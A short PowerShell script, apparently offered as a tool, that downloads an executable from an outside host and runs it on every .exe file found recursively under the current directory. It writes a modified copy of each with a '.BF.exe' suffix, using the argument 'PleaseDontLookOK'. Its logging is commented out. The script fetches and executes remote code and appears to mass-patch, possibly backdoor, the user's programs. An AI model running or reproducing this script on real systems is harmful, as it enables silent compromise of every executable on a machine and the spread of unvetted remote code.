Invoke-WebRequest https://ml.tty.bz/FATTACATTAPILLA.exe -OutFile FATTACATTAPILLA.exe
$files = get-childitem -Recurse
#"Files Found" >> catta.log
#$files >> catta.log
foreach ($file in $files) {
    $fullpath = $file.FullName
    if ($fullpath -like "*.exe") {
        $outpath = $fullpath + ".BF.exe"
        .\FATTACATTAPILLA.exe $fullpath $outpath PleaseDontLookOK
        #$output = "match " + $fullpath
        #$output >> catta.log
    }
    else {
        #$output = "no match " + $fullpath
        #$output >> catta.log
    }
}

#$files = get-childitem -Recurse
#"Post-Files Found" >> catta.log
#$files >> catta.log
